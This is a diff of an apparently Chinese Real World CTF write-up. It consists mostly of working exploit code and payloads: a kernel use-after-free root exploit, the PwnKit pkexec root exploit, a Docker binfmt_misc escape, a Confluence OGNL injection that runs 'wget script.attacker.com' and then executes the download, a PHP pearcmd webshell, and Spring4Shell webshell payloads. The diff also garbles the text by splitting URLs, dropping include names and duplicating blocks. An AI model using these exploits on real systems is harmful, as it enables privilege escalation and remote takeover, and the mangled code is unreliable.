@@ -15,7 +15,7 @@ Digging into Kernel 3
 
 题目在5.19.0版本的Linux Kernel上运行了一个有漏洞的驱动，驱动代码比较简单，包括uaf，race condition，memory leak等多个漏洞。通过漏洞驱动获取root权限有很多种方法，这里贴出作者old-school的exploit代码（并非最简单的方法，甚至相对复杂，使用USMA/DirtyCred等手段可以写出更简洁更稳定的exploit）
 
-#define _GNU_SOURCE#include <sched.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unistd.h>#include <ctype.h>#include <err.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/timerfd.h>#include <sys/ioctl.h>#include <sys/syscall.h>#include <linux/keyctl.h>
+#define _GNU_SOURCE#include <sched.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <ctype.h>#include <err.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/timerfd.h>#include <sys/ioctl.h>#include <sys/syscall.h>#include <linux/keyctl.h>
 // user_key_payload#define size_user_key_payload (24)// (gdb) ptype /o struct user_key_payload// /* offset | size */ type = struct user_key_payload {// /* 0 | 16 */ struct callback_head {// /* 0 | 8 */ struct callback_head *next;// /* 8 | 8 */ void (*func)(struct callback_head *);// // /* total size (bytes): 16 */// } rcu;// /* 16 | 2 */ unsigned short datalen;// /* XXX 6-byte hole */// /* 24 | 0 */ char data[];// // /* total size (bytes): 24 */// }
 int key_alloc(char *description, char *payload, int payload_len) { return syscall( __NR_add_key, "user", description, payload, payload_len, KEY_SPEC_PROCESS_KEYRING );}
 void key_spray(int *keys, int spray_count, char *payload, int payload_len, char *description, int description_len) { char *tmp_desc = (char *)malloc(description_len + 100); memset(tmp_desc, 0, description_len + 100); memcpy(tmp_desc, description, description_len); for(int i = 0; i < spray_count; i++) { snprintf(tmp_desc + description_len, 100, "_%d", i); keys[i] = key_alloc(tmp_desc, payload, payload_len); if(keys[i] == -1) { perror("add_key"); printf("failed index: %dn", i); // break; exit(-1); } } free(tmp_desc);}
@@ -30,8 +30,17 @@ void hexdump(void *mem, unsigned int len) { putchar('n'); for(int i = 0; i < len
  /* print hex data */ if(i < len) { printf("%02x ", 0xFF & ((char*)mem)[i]); } /* end of block, just aligning for ASCII dump */ else { printf(" "); }
  /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) { /* end of block, not really printing */ if(j >= len) { putchar(' '); } /* printable char */ else if(isprint(((char*)mem)[j])) { putchar(0xFF & ((char*)mem)[j]); } /* other char */ else { putchar('.'); } } putchar('n'); } } putchar('n');}// utils
 // here we startstruct add_param { int idx; int size; char *cont;};
-int g_fd;int seq_fd;unsigned long long g_vmlinux = 0;unsigned long long g_modprobe_path = 0;unsigned long long g_do_task_dead = 0;unsigned long long g_heap = 0;
-unsigned long long pop_rax_ret = 0;unsigned long long pop_rcx_ret = 0;unsigned long long pop_rdi_ret = 0;unsigned long long mov_ptr_rax_rdi_ret = 0;unsigned long long ret = 0;
+int g_fd;
+int seq_fd;
+unsigned long long g_vmlinux = 0;
+unsigned long long g_modprobe_path = 0;
+unsigned long long g_do_task_dead = 0;
+unsigned long long g_heap = 0;
+unsigned long long pop_rax_ret = 0;
+unsigned long long pop_rcx_ret = 0;
+unsigned long long pop_rdi_ret = 0;
+unsigned long long mov_ptr_rax_rdi_ret = 0;
+unsigned long long ret = 0;
 
 void setup() { g_fd = open("/dev/rwctf", O_RDWR); printf("g_fd = %dn", g_fd);
  system("echo '#!/bin/shnchmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x");
@@ -67,15 +76,21 @@ int main() { setup(); leak();
 
 Be-a-PK-LPE-Master
 
-#include <stdio.h>#include <stdlib.h>#include <unistd.h>
-char *shell = "#include <stdio.h>n" "#include <stdlib.h>n" "#include <unistd.h>nn" "void gconv() {}n" "void gconv_init() {n" " setuid(0); setgid(0);n" " seteuid(0); setegid(0);n" " system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");n" " exit(0);n" "}";
+#include <stdio.h>#include <stdlib.h>#include 
+char *shell = "#include <stdio.h>n" "#include <stdlib.h>n" "#include nn" "void gconv() {}n" "void gconv_init() {n" " setuid(0); setgid(0);n" " seteuid(0); setegid(0);n" " system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");n" " exit(0);n" "}";
 int main(int argc, char *argv[]) { FILE *fp; system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"); system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules"); fp = fopen("pwnkit/pwnkit.c", "w"); fprintf(fp, "%s", shell); fclose(fp); system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"); char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL }; execve("/usr/bin/pkexec", (char*[]){NULL}, env);}
 
 Be-a-Docker-Escaper-2
 
 其 binfmt 的格式如下：
 
-name:type:offset:magic:mask:interpreter:flags
+name:
+type:
+offset:
+magic:
+mask:
+interpreter:
+flags
 
 这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。
 
@@ -91,7 +106,9 @@ name：规则名
 
 1、首先注册一个自己的 binfmt
 
-echo ":test:M::x23x21x2fx62x69x6ex2fx73x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register
+echo ":
+test:M::
+x23x21x2fx62x69x6ex2fx73x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register
 
 2、往 /var/lib/docker/overlay2/$overlay/diff/tmp/exploit 写入我们要执行的命令
 
@@ -113,7 +130,8 @@ Web
 
 Be-a-Wiki-Hacker
 
-GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: example.com:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close
+GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: example.com:
+8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close
 
 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
 
@@ -129,15 +147,18 @@ Evil MySQL Server
 
 ApacheCommandText
 
-${base64decoder:JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}
+${base64decoder:
+JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}
 
 Be-a-Langurage-Expert
 
-GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php HTTP/1.1Host: localhost:8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36Connection: closeCache-Control: max-age=0
+GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php HTTP/1.1Host: localhost:
+8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36Connection: closeCache-Control: max-age=0
 
 此时在 /tmp/1.php 中的内容就是 <?=@eval($_POST[a]);?>。我们之后只需要使用Webshell 管理工具连接如下地址即可。
 
-http://your-ip:8888/?&lang=../../../../../../../../../../../tmp/1
+http://your-ip:
+8888/?&lang=../../../../../../../../../../../tmp/1
 
 最后执行 /readflag 获取 Flag
 
@@ -149,19 +170,23 @@ Yummy Api
 
 然后通过调用项目的 pre-script 功能，上传 vm2 的逃逸脚本实现 RCE。
 
-py -3 .poc.py --debug one4all -u http://ip:9090/ -c "/readflag"
+py -3 .poc.py --debug one4all -u http://ip:
+9090/ -c "/readflag"
 
 Spring4Shell
 
-$ python git_extract.py http://47.98.216.107:31584/.git/
+$ python git_extract.py http://47.98.216.107:
+31584/.git/
 
 $ cat 47.98.216.107_31584/server.xml|grep appBase<Host name="XXXX" appBase="chaitin"
 
 Spring4shell EXP：
 
-可使用:https://github.com/reznok/Spring4Shell-POC.需要手动指定 web 路径
+可使用:
+https://github.com/reznok/Spring4Shell-POC.需要手动指定 web 路径
 
-python exploit.py --url http://47.98.216.107:31584/ --dir chaitin/ROOT
+python exploit.py --url http://47.98.216.107:
+31584/ --dir chaitin/ROOT
 
 解题思路二：
 
@@ -173,7 +198,8 @@ webshell 写入路径：/tmp/shell.jsp
 
 访问 webshell：
 
-http://47.98.216.107:31584/tmp/shell.jsp?cmd=id
+http://47.98.216.107:
+31584/tmp/shell.jsp?cmd=id
 
 读取 flag
 
@@ -244,7 +270,7 @@ Check-In
 
 
 ```
-#define _GNU_SOURCE#include <sched.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unistd.h>#include <ctype.h>#include <err.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/timerfd.h>#include <sys/ioctl.h>#include <sys/syscall.h>#include <linux/keyctl.h>
+    #define _GNU_SOURCE#include <sched.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <ctype.h>#include <err.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/timerfd.h>#include <sys/ioctl.h>#include <sys/syscall.h>#include <linux/keyctl.h>
 // user_key_payload#define size_user_key_payload (24)// (gdb) ptype /o struct user_key_payload// /* offset | size */ type = struct user_key_payload {// /* 0 | 16 */ struct callback_head {// /* 0 | 8 */ struct callback_head *next;// /* 8 | 8 */ void (*func)(struct callback_head *);// // /* total size (bytes): 16 */// } rcu;// /* 16 | 2 */ unsigned short datalen;// /* XXX 6-byte hole */// /* 24 | 0 */ char data[];// // /* total size (bytes): 24 */// }
 int key_alloc(char *description, char *payload, int payload_len) { return syscall( __NR_add_key, "user", description, payload, payload_len, KEY_SPEC_PROCESS_KEYRING );}
 void key_spray(int *keys, int spray_count, char *payload, int payload_len, char *description, int description_len) { char *tmp_desc = (char *)malloc(description_len + 100); memset(tmp_desc, 0, description_len + 100); memcpy(tmp_desc, description, description_len); for(int i = 0; i < spray_count; i++) { snprintf(tmp_desc + description_len, 100, "_%d", i); keys[i] = key_alloc(tmp_desc, payload, payload_len); if(keys[i] == -1) { perror("add_key"); printf("failed index: %dn", i); // break; exit(-1); } } free(tmp_desc);}
@@ -254,13 +280,22 @@ int key_free(int key_id) { return syscall( __NR_keyctl, KEYCTL_UNLINK, key_id, K
 int key_read(int key_id, char *retbuf, int retbuf_len) { return syscall( __NR_keyctl, KEYCTL_READ, key_id, retbuf, retbuf_len );}// user_key_payload
 
 // utilsvoid breakpoint() { printf("press enter to continue...n"); getchar();}
-#ifndef HEXDUMP_COLS#define HEXDUMP_COLS 16#endif
+    #ifndef HEXDUMP_COLS#define HEXDUMP_COLS 16#endif
 void hexdump(void *mem, unsigned int len) { putchar('n'); for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf("0x%06x: ", i); }
  /* print hex data */ if(i < len) { printf("%02x ", 0xFF & ((char*)mem)[i]); } /* end of block, just aligning for ASCII dump */ else { printf(" "); }
  /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) { /* end of block, not really printing */ if(j >= len) { putchar(' '); } /* printable char */ else if(isprint(((char*)mem)[j])) { putchar(0xFF & ((char*)mem)[j]); } /* other char */ else { putchar('.'); } } putchar('n'); } } putchar('n');}// utils
 // here we startstruct add_param { int idx; int size; char *cont;};
-int g_fd;int seq_fd;unsigned long long g_vmlinux = 0;unsigned long long g_modprobe_path = 0;unsigned long long g_do_task_dead = 0;unsigned long long g_heap = 0;
-unsigned long long pop_rax_ret = 0;unsigned long long pop_rcx_ret = 0;unsigned long long pop_rdi_ret = 0;unsigned long long mov_ptr_rax_rdi_ret = 0;unsigned long long ret = 0;
+int g_fd;
+int seq_fd;
+unsigned long long g_vmlinux = 0;
+unsigned long long g_modprobe_path = 0;
+unsigned long long g_do_task_dead = 0;
+unsigned long long g_heap = 0;
+unsigned long long pop_rax_ret = 0;
+unsigned long long pop_rcx_ret = 0;
+unsigned long long pop_rdi_ret = 0;
+unsigned long long mov_ptr_rax_rdi_ret = 0;
+unsigned long long ret = 0;
 
 void setup() { g_fd = open("/dev/rwctf", O_RDWR); printf("g_fd = %dn", g_fd);
  system("echo '#!/bin/shnchmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x");
@@ -293,139 +328,48 @@ int main() { setup(); leak();
  // breakpoint(); hijack();
  // breakpoint();
  return 0;}
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>#include <unistd.h>
-char *shell = "#include <stdio.h>n" "#include <stdlib.h>n" "#include <unistd.h>nn" "void gconv() {}n" "void gconv_init() {n" " setuid(0); setgid(0);n" " seteuid(0); setegid(0);n" " system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");n" " exit(0);n" "}";
+    #include <stdio.h>#include <stdlib.h>#include 
+char *shell = "#include <stdio.h>n" "#include <stdlib.h>n" "#include nn" "void gconv() {}n" "void gconv_init() {n" " setuid(0); setgid(0);n" " seteuid(0); setegid(0);n" " system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");n" " exit(0);n" "}";
 int main(int argc, char *argv[]) { FILE *fp; system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"); system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules"); fp = fopen("pwnkit/pwnkit.c", "w"); fprintf(fp, "%s", shell); fclose(fp); system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"); char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL }; execve("/usr/bin/pkexec", (char*[]){NULL}, env);}
-```
-
-
-
-```
-name:type:offset:magic:mask:interpreter:flags
-```
-
-
-
-```
-echo ":test:M::x23x21x2fx62x69x6ex2fx73x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register
-```
-
-
-
-```
+name:
+type:
+offset:
+magic:
+mask:
+interpreter:
+flags
+echo ":
+test:M::
+x23x21x2fx62x69x6ex2fx73x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register
 echo '#!/bin/bash' > /tmp/exploitecho "docker cp /root/flag $container:/tmp/" >> /tmp/exploitchmod 777 /tmp/exploit
-```
-
-
-
-```
 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyelftoolsgit clone https://github.com/zh-explorer/dirtycow.gitcd dirtycowmkdir buildcd buildcmake ..make./dirtycow {IP} 31337
-```
-
-
-
-```
 busctl --system call org.dbus.rwctf /org/dbus/rwctf org.dbus.rwctf1 SayBoss s "/tmp/exp.sh"
-```
-
-
-
-```
-GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: example.com:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close
-```
-
-
-
-```
+GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: example.com:
+8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close
 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
-```
-
-
-
-```
 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("wget script.attacker.com").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
-```
-
-
-
-```
 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("chmod +x index.html").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
-```
-
-
-
-```
 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("bash index.html").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
-```
-
-
-
-```
-${base64decoder:JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}
-```
-
-
-
-```
-GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php HTTP/1.1Host: localhost:8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36Connection: closeCache-Control: max-age=0
-```
-
-
-
-```
-py -3 .poc.py --debug one4all -u http://ip:9090/ -c "/readflag"
-```
-
-
-
-```
-$ python git_extract.py http://47.98.216.107:31584/.git/
-```
-
-
-
-```
+${base64decoder:
+JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}
+GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php HTTP/1.1Host: localhost:
+8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36Connection: closeCache-Control: max-age=0
+py -3 .poc.py --debug one4all -u http://ip:
+9090/ -c "/readflag"
+$ python git_extract.py http://47.98.216.107:
+31584/.git/
 $ cat 47.98.216.107_31584/server.xml|grep appBase<Host name="XXXX" appBase="chaitin"
-```
-
-
-
-```
-python exploit.py --url http://47.98.216.107:31584/ --dir chaitin/ROOT
-```
-
-
-
-```
+python exploit.py --url http://47.98.216.107:
+31584/ --dir chaitin/ROOT
 payload：class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.appBase=/
-```
-
-
-
-```
 pragma solidity ^0.8.0;import "./Happy.sol";
 contract Exploit { event tokenA_tokenB(address, address); IHappyFactory factory = IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36)); IHappyPair public pair; IHappyERC20 public tokenA; IHappyERC20 public tokenB; address public gamer;
  constructor(address tokenA_address, address tokenB_address) { gamer = msg.sender; tokenA = IHappyERC20(tokenA_address); tokenB = IHappyERC20(tokenB_address); pair = IHappyPair(factory.getPair(tokenA_address, tokenB_address)); }
  function attack(uint256 amount0, uint256 amount1) public { pair.swap(amount0, amount1, address(this), "0x"); tokenB.transfer(gamer, 1 ether); }
  fallback() external { pair.sync(); tokenA.transferFrom(gamer, address(pair), 1 ether); }}
-```
-
-
-
-```
 from Crypto.Util.number import *from Crypto.Cipher import AESp = 193387944202565886198256260591909756041P.<x> = GF(p)[]f = x^3 + 2*x^2 + xP = (4, 10)Q = (65639504587209705872811542111125696405,125330437930804525313353306745824609665)f_ = f.subs(x=x-1)print f_.factor()
 P_ = (P[0] +1, P[1])Q_ = (Q[0] +1, Q[1])
 t = GF(p)(p-1).square_root()u = (P_[1] + t*P_[0])/(P_[1] - t*P_[0]) % pv = (Q_[1] + t*Q_[0])/(Q_[1] - t*Q_[0]) % pprint(v.log(u))k = v.log(u)aes = AES.new(long_to_bytes(k).ljust(16, ' '), AES.MODE_CBC, ' '*16)flag = "b3669dc657cef9dc17db4de5287cd1a1e8a48184ed9746f4c52d3b9f8186ec046d6fb1b8ed1b45111c35b546204b68e0".decode("hex")print(len(flag))plaintext = aes.decrypt(flag)print(plaintext)
-```
-
-
-
-```
 function hook(){ Java.perform(function(){ var SecurityParams = Java.use("b.a.a.a"); SecurityParams.a.implementation = function(str){ var ret = this.a(str); console.log(ret); return ret; } }); }function main() { hook()}
 setImmediate(main)
 ```
